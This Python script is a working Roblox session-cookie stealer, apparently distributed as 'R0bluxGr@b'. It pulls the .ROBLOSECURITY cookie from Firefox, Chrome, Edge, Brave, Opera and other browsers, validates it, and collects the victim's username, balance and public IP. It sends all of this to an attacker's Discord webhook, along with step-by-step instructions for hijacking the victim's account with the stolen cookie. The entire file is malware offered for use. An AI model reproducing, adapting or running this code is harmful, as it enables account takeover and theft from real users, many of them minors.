try:
    import robloxpy, requests, browser_cookie3
except Exception as e:
    print(str(e)[16:].replace("'", "") + ' is not installed, run install.bat first.'), exit()


# noinspection PyBroadException
class SMTHGRB:
    def __init__(self, webhook: str):
        if not "discord.com/api/webhooks/" in webhook:
            print('You did not provide a webhook on Line 187.'), exit()

        self.webhook = webhook
        self.cookie = None
        self.platform = None
        self.embeds = []

        self.browsers()

    def checker(self):
        if not robloxpy.Utils.CheckCookie(self.cookie) == "Valid Cookie":
            return requests.post(url=self.webhook, data={
                'content': f'Found a dead cookie on {self.platform}{" - Continuing." if self.platform != "Librewolf" else ""}'})

        for embed in self.embeds:
            if self.cookie in embed['description']:
                return

        user = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": self.cookie}).json()
        id = user['UserID']
        try:
            ip = requests.get('https://api.ipify.org/').text
        except:
            ## It could not get any connection, so we just do a "N/A" Value
            ip = "N/A"

            # Here you can modify the message that will be sent

        self.embeds.append(
            {
                "title": f"✔ Valid Account - {self.platform}",
                "description": f"Username: **{user['UserName']}**\nRobux: **R${int(user['RobuxBalance']):,}**\nPremium: **{user['IsPremium']}**\nCreated: **{robloxpy.User.External.CreationDate(id, 1)}** (*{int(robloxpy.User.External.GetAge(id)):,} days ago*)\nRAP: **{int(robloxpy.User.External.GetRAP(id)):,}**\nFriends: **{int(robloxpy.User.Friends.External.GetCount(id)):,}**\n\n IP Address: ||**{ip}**|| \n"
                               f"\n See the cookie at the other message !",
                "color": 12452044,
                "footer": {
                    "text": "v1.1.1 ; R0bluxGr@b by Independent-coder"
                }
            }
        )


        self.embeds.append(
            {
                "title": f"Access the account on - {self.platform}",
                "description": f"Username: **{user['UserName']}**\nRobux: **R${int(user['RobuxBalance']):,}**\n Created: **{robloxpy.User.External.CreationDate(id, 1)}** (*{int(robloxpy.User.External.GetAge(id)):,} days ago*)\n  Cookie:\n```fix\n {self.cookie} ```"
                               f"\n Now copy the cookie go into Roblox login.\n"
                               f"\n Login into an temporary account."
                               f"\n Open inspect go into Application. Click on Cookies. Click on the 7th Cookies. It should be ROBLOSECURITY."
                               f"\n Right click on value click modify and delete your and replace by the victim's cookie. \n"
                               f"\n Refresh and you are into his account !"
                               f"\n Thanks for using my cookies grabber for roblox !",
                "color": 12452044,
                "footer": {
                    "text": "v1.1.1 ; R0bluxGr@b by Independent-coder"
                }
            }
        )

    # this is the part where it checks the cookies
    def browsers(self):
        try:
            self.platform = "Firefox"
            for cookie in browser_cookie3.firefox(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        try:
            self.platform = "Safari"
            for cookie in browser_cookie3.safari(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        try:
            self.platform = "Chromium"
            for cookie in browser_cookie3.chromium(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        try:
            self.platform = "Edge"
            for cookie in browser_cookie3.edge(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        try:
            self.platform = "Opera GX"
            for cookie in browser_cookie3.opera_gx(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        try:
            self.platform = "Opera"
            for cookie in browser_cookie3.opera(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        try:
            self.platform = "Brave"
            for cookie in browser_cookie3.brave(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        try:
            self.platform = "Chrome"
            for cookie in browser_cookie3.chrome(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        try:
            self.platform = "Librewolf"
            for cookie in browser_cookie3.librewolf(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        if len(self.embeds) == 0:
            exit()

        self.send()

    # hey here is the part where the message is sent

    def send(self):
        requests.post(self.webhook, json={

            "username": "R0bluxGr@b",
            "content": "@everyone",  # You can change this to be just no ping or a @here ping.
            "avatar_url": "https://cdn.discordapp.com/avatars/924130884452511845/1d8a7d3f6bfe5bf654529724a3519d08?size=1024" # You can change the avatar if you are advanced in python.
                          "/latest?cb=20190801142211&path-prefix=fr"
                          ".png?size=1024",
            "embeds": self.embeds,

        })




SMTHGRB("PUT YOUR WEBHOOK URL IN THE QUOTE")
